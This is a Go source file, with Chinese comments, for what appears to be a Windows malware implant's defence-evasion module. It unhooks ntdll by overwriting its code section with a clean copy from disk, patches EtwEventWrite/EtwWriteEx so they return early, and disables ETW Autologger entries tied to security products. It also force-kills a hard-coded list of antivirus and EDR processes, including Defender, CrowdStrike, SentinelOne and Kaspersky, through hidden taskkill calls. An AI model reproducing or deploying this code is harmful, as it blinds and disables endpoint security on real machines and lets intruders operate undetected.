//go:build windows && !light

package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── EDR 失明 / 击杀 ─────────────────────────────────────────────
//
// edr_blind（失明，纯用户态，不杀进程）：
//   1. ntdll 脱钩：从磁盘重载干净 ntdll，覆盖被 EDR 用户态 hook 的 .text；
//   2. ETW patch：patch EtwEventWrite/EtwWriteEx 为提前返回，摘掉 EDR 的 ETW 数据源；
//   3. Autologger 清理：禁用已知 EDR 的 ETW 自动记录器（需 admin，尽力而为）。
//   每步都带自检输出，便于验证是否生效。
//
// edr_kill（击杀，激进）：按进程名 taskkill 终止杀软/EDR 进程（PPL 保护进程可能失败）。

var defaultAVProcesses = []string{
	// Microsoft Defender
	"MsMpEng.exe", "MsMpEngCP.exe", "NisSrv.exe", "SecurityHealthService.exe", "wdswift.exe",
	"SenseNdr.exe", "mssecess.exe",
	// 火绒
	"HipsTray.exe", "HipsDaemon.exe", "wsctrl.exe", "usysdiag.exe",
	// 360
	"ZhuDongFangYu.exe", "360tray.exe", "360safe.exe", "QHSafeTray.exe",
	// 腾讯电脑管家
	"QQPCTray.exe", "QQPCRTP.exe",
	// 金山
	"KwsDaemon.exe", "kavsvc.exe",
	// CrowdStrike
	"csagent.exe", "falcon", "CrowdStrike.exe",
	// SentinelOne
	"SentinelServiceHost.exe", "SentinelAgent.exe",
	// Symantec / Norton
	"ccSvcHst.exe",
	// McAfee
	"mcshield.exe", "frameworkservice.exe",
	// Kaspersky
	"avp.exe",
	// Bitdefender
	"bdagent.exe", "vsserv.exe",
	// Carbon Black
	"cb.exe", "CB_BlueV2.exe",
	// Sophos
	"SophosUI.exe", "SophosEDR.exe", "SophosAgent.exe",
	// Tanium
	"TaniumClient.exe",
}

func handleEDRBlind(taskData string) (string, int32, string) {
	var b strings.Builder
	b.WriteString("== EDR Blind (失明) ==\n")

	// ntdll 脱钩 + 自检（脱钩前后与干净副本的差异字节数）
	before, after, err := unhookNtdll()
	if err != nil {
		b.WriteString(fmt.Sprintf("[-] ntdll unhook: %v\n", err))
	} else {
		b.WriteString(fmt.Sprintf("[+] ntdll unhook: before=%d bytes differ, after=%d bytes differ (0 = 已脱钩)\n", before, after))
	}

	// ETW patch + 自检（打印函数前 4 字节，确认补丁生效）
	if err := patchEtw(); err != nil {
		b.WriteString(fmt.Sprintf("[-] ETW patch: %v\n", err))
	} else {
		if addr := getAPI("ntdll.dll", "EtwEventWrite"); addr != 0 {
			first := (*[4]byte)(unsafe.Pointer(addr))[:4]
			b.WriteString(fmt.Sprintf("[+] ETW EtwEventWrite patched, first bytes: %02x %02x %02x %02x (48 33 c0 c3 = 已patch)\n",
				first[0], first[1], first[2], first[3]))
		} else {
			b.WriteString("[+] ETW EtwEventWrite patched (early return)\n")
		}
	}

	if n := cleanAutologgers(); n > 0 {
		b.WriteString(fmt.Sprintf("[+] disabled %d ETW Autologger entries\n", n))
	} else {
		b.WriteString("[*] no Autologger entry disabled (需要管理员权限?)\n")
	}

	return b.String(), 0, ""
}

func handleEDRKill(taskData string) (string, int32, string) {
	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)
	names := req.Processes
	if len(names) == 0 {
		names = defaultAVProcesses
	}

	var b strings.Builder
	b.WriteString("== EDR Kill (击杀) ==\n")
	for _, n := range names {
		out, err := killProcessByName(n)
		if err != nil {
			b.WriteString(fmt.Sprintf("[-] %s: %v\n", n, strings.TrimSpace(out)))
		} else {
			// 自检：taskkill 成功后确认进程是否已消失
			if procAlive(n) {
				b.WriteString(fmt.Sprintf("[?] %s: taskkill 返回成功但进程仍存在（可能被自保护拉起）\n", n))
			} else {
				b.WriteString(fmt.Sprintf("[+] %s terminated\n", n))
			}
		}
	}
	return b.String(), 0, ""
}

func killProcessByName(name string) (string, error) {
	cmd := exec.Command("taskkill", "/F", "/IM", name)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// procAlive 检查指定镜像名进程是否仍存在（tasklist 过滤）。
func procAlive(name string) bool {
	cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+name, "/NH")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(out)), strings.ToLower(name))
}

// ─── ntdll 脱钩 ──────────────────────────────────────────────────

// ntdllBase 返回当前进程 ntdll.dll 基址（GetModuleHandleW，兼容所有架构）。
func ntdllBase() uintptr {
	proc := resolveAPI("kernel32.dll", "GetModuleHandleW")
	name := []uint16{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0}
	r1, _, _ := proc.Call(uintptr(unsafe.Pointer(&name[0])))
	return r1
}

// peTextSection 从内存中的 PE 镜像解析 .text 节（虚拟地址 + 大小）。
func peTextSection(base uintptr) (va, size uintptr, err error) {
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return 0, 0, errors.New("bad MZ")
	}
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	nt := base + uintptr(eLfanew)
	if *(*uint32)(unsafe.Pointer(nt)) != 0x00004550 {
		return 0, 0, errors.New("bad PE")
	}
	numSec := int(*(*uint16)(unsafe.Pointer(nt + 6)))
	optSize := int(*(*uint16)(unsafe.Pointer(nt + 20)))
	secStart := nt + 24 + uintptr(optSize)
	for i := 0; i < numSec; i++ {
		sec := secStart + uintptr(i*40)
		name := (*[8]byte)(unsafe.Pointer(sec))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			vSize := *(*uint32)(unsafe.Pointer(sec + 8))
			vAddr := *(*uint32)(unsafe.Pointer(sec + 12))
			return uintptr(vAddr), uintptr(vSize), nil
		}
	}
	return 0, 0, errors.New(".text section not found")
}

// mapFileImage 以只读映射方式打开磁盘上的 PE 文件，返回映射基址。
func mapFileImage(path string) (uintptr, error) {
	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
	procCreateFileMappingW := resolveAPI("kernel32.dll", "CreateFileMappingW")
	procMapViewOfFile := resolveAPI("kernel32.dll", "MapViewOfFile")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	pw, _ := windows.UTF16PtrFromString(path)
	hFile, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pw)), 0x80000000, /*GENERIC_READ*/
		0x7 /*FILE_SHARE_READ|WRITE|DELETE*/, 0, 3 /*OPEN_EXISTING*/, 0, 0)
	if hFile == ^uintptr(0) {
		return 0, fmt.Errorf("CreateFileW(%s) failed", path)
	}
	defer procCloseHandle.Call(hFile)

	// 注意：PAGE_READONLY = 0x02（0x04 是 PAGE_READWRITE，需文件以读写打开，会导致失败）
	hMap, _, _ := procCreateFileMappingW.Call(hFile, 0, 0x02 /*PAGE_READONLY*/, 0, 0, 0)
	if hMap == 0 {
		return 0, fmt.Errorf("CreateFileMappingW failed")
	}
	defer procCloseHandle.Call(hMap)

	base, _, _ := procMapViewOfFile.Call(hMap, 0x04 /*FILE_MAP_READ*/, 0, 0, 0)
	if base == 0 {
		return 0, fmt.Errorf("MapViewOfFile failed")
	}
	return base, nil
}

// unmapFileImage 释放只读映射视图。
func unmapFileImage(base uintptr) {
	if base == 0 {
		return
	}
	proc := resolveAPI("kernel32.dll", "UnmapViewOfFile")
	proc.Call(base)
}

// countDiff 统计 src 与 dst 前 n 字节中不同的字节数。
func countDiff(src, dst uintptr, n uintptr) int {
	sb := (*[1 << 30]byte)(unsafe.Pointer(src))[:n]
	db := (*[1 << 30]byte)(unsafe.Pointer(dst))[:n]
	diffs := 0
	for i := uintptr(0); i < n; i++ {
		if sb[i] != db[i] {
			diffs++
		}
	}
	return diffs
}

// unhookNtdll 从磁盘重载干净 ntdll 并覆盖已加载模块的 .text（消除用户态 hook）。
// 返回覆盖前后的差异字节数（before>0 说明有 hook，after=0 说明已脱钩）。
func unhookNtdll() (before, after int, err error) {
	base := ntdllBase()
	if base == 0 {
		return 0, 0, errors.New("ntdll base not found")
	}
	loadedVA, loadedSize, err := peTextSection(base)
	if err != nil {
		return 0, 0, err
	}
	clean, err := mapFileImage(`C:\Windows\System32\ntdll.dll`)
	if err != nil {
		return 0, 0, err
	}
	defer unmapFileImage(clean)

	cleanVA, cleanSize, err := peTextSection(clean)
	if err != nil {
		return 0, 0, err
	}
	n := loadedSize
	if cleanSize < n {
		n = cleanSize
	}
	src := clean + uintptr(cleanVA)
	dst := base + uintptr(loadedVA)

	before = countDiff(src, dst, n)

	pageSize := uintptr(0x1000)
	for off := uintptr(0); off < n; off += pageSize {
		sz := pageSize
		if off+sz > n {
			sz = n - off
		}
		if err := vprotect(dst+off, sz, 0x04); err != nil { // PAGE_READWRITE
			return 0, 0, err
		}
		srcBytes := (*[1 << 30]byte)(unsafe.Pointer(src + off))[:sz]
		dstBytes := (*[1 << 30]byte)(unsafe.Pointer(dst + off))[:sz]
		copy(dstBytes, srcBytes)
		if err := vprotect(dst+off, sz, 0x20); err != nil { // PAGE_EXECUTE_READ
			return 0, 0, err
		}
	}
	after = countDiff(src, dst, n)
	return before, after, nil
}

// ─── ETW patch ───────────────────────────────────────────────────

// patchEtw 将 ntdll 的 EtwEventWrite/EtwWriteEx 补丁为提前返回，摘掉 EDR 的 ETW 数据源。
func patchEtw() error {
	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0x48, 0x33, 0xC0, 0xC3} // xor rax,rax; ret
	} else {
		patch = []byte{0x33, 0xC0, 0xC3} // xor eax,eax; ret
	}
	for _, name := range []string{"EtwEventWrite", "EtwWriteEx"} {
		addr := getAPI("ntdll.dll", name)
		if addr == 0 {
			continue
		}
		if err := vprotect(addr, uintptr(len(patch)), 0x04); err != nil {
			continue
		}
		dst := (*[8]byte)(unsafe.Pointer(addr))[:len(patch)]
		copy(dst, patch)
		_ = vprotect(addr, uintptr(len(patch)), 0x20)
		return nil
	}
	return errors.New("EtwEventWrite/EtwWriteEx not found")
}

// ─── Autologger 清理 ─────────────────────────────────────────────

// cleanAutologgers 禁用已知 EDR 的 ETW 自动记录器（设置 Start=0）。返回禁用数量。
func cleanAutologgers() int {
	const basePath = `SYSTEM\CurrentControlSet\Control\WMI\Autologger`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, basePath, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return 0
	}
	defer k.Close()
	subs, err := k.ReadSubKeyNames(-1)
	if err != nil {
		return 0
	}
	known := []string{
		"threat-intelligence", "sysmon", "defender", "sense", "falcon",
		"cylance", "sentinel", "carbon", "crowdstrike", "symantec", "mcafee", "kaspersky",
	}
	disabled := 0
	for _, sub := range subs {
		low := strings.ToLower(sub)
		hit := false
		for _, kk := range known {
			if strings.Contains(low, kk) {
				hit = true
				break
			}
		}
		if !hit {
			continue
		}
		sk, err := registry.OpenKey(registry.LOCAL_MACHINE, basePath+`\`+sub, registry.SET_VALUE)
		if err == nil {
			_ = sk.SetDWordValue("Start", 0)
			sk.Close()
			disabled++
		}
	}
	return disabled
}

// ─── 通用工具 ────────────────────────────────────────────────────

// vprotect 用直接系统调用修改内存保护（返回错误含状态码）。
func vprotect(addr uintptr, size uintptr, prot uint32) error {
	regionSize := size
	p := addr
	var old uint32
	if st := ntProtectVirtualMemory(currentProcess, &p, &regionSize, prot, &old); st != 0 {
		return fmt.Errorf("VirtualProtect(0x%x) failed: 0x%x", prot, st)
	}
	return nil
}
